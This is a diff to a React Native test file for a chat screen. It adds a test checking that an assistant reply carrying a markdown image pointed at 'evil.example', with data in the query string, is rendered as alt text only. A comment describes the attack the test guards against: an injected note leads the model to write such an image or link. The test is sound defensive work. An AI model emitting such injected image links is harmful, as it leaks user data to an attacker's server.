@@ -55,6 +55,14 @@ const message: ChatMessage = {
   createdAt: '2026-01-01T00:00:00.000Z',
 };
 
+/** The host element types in a rendered tree, without serialising props (a screen's tree is circular). */
+function hostTypes(node: unknown): string[] {
+  if (Array.isArray(node)) return node.flatMap(hostTypes);
+  if (node === null || typeof node !== 'object') return [];
+  const { type, children } = node as { type: string; children?: unknown };
+  return [type, ...hostTypes(children)];
+}
+
 function renderScreen(conversationId: string, initialMessage?: string) {
   mockedUseLocalSearchParams.mockReturnValue({ id: conversationId, initialMessage } as never);
   const queryClient = new QueryClient({ defaultOptions: { queries: { retry: false } } });
@@ -84,6 +92,26 @@ describe('ChatScreen', () => {
     const { getByText } = await renderScreen('conv-1');
 
     await waitFor(() => expect(getByText('Hello!')).toBeTruthy());
+  });
+
+  // JEF-548: an injected note can make the model write an image or a link; neither may load or open.
+  it('shows an assistant image as its alt text, with no Image to fetch it', async () => {
+    mockedUseChatHistory.mockReturnValue({
+      data: [
+        {
+          ...message,
+          content: 'They liked your portfolio. ![status](https://evil.example/b?d=165000)',
+        },
+      ],
+      isLoading: false,
+    } as never);
+
+    const { getByText, queryByText, toJSON } = await renderScreen('conv-1');
+
+    await waitFor(() => expect(getByText('[status]', { exact: false })).toBeTruthy());
+    expect(hostTypes(toJSON())).toContain('Text');
+    expect(hostTypes(toJSON())).not.toContain('Image');
+    expect(queryByText(/evil\.example/)).toBeNull();
   });
 
   it('shows a proposal card under the assistant reply, live while pending (JEF-469)', async () => {
